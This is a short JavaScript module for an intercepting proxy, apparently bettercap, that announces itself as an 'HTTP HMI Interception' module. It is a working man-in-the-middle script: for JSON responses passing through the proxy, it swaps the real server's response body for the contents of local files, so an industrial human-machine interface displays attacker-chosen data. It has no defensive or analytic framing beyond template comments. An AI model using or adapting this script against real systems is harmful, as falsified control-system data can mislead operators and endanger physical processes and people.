function readConfig(key) {
    filename = key + ".txt";
    jsonStr = readFile(filename);
    return jsonStr;
}

function modifyJson(res) {
    log("Received JSON\n");

    var body = res.ReadBody();

    if (res.Body.length > 0) {
    	json = JSON.parse(body);
    	if (json.r == 0) {
	    for (key in json) {
		if (key != "r") {
                    var newJsonContents = readConfig(key);
    	            res.Body = newJsonContents
                    log(res.Body)
		}
	    }
    	}
    }
}

// called when the script is loaded
function onLoad() {
    log("HTTP HMI Interception module loaded.");
}

// called when the request is received by the proxy
// and before it is sent to the real server.
function onRequest(req, res) {

}

// called when the request is sent to the real server
// and a response is received
function onResponse(req, res) {
    // I think this is where the majority of our logic should go, modifying res
    if (res.ContentType.indexOf("application/json") != -1) {
	modifyJson(res);
    }
}

// called every time an unknown session command is typed,
// proxy modules can optionally handle custom commands this way:
function onCommand(cmd) {
    if( cmd == "test" ) {
        /*
         * Custom session command logic here.
         */

        // tell the session we handled this command
        return true
    }
}
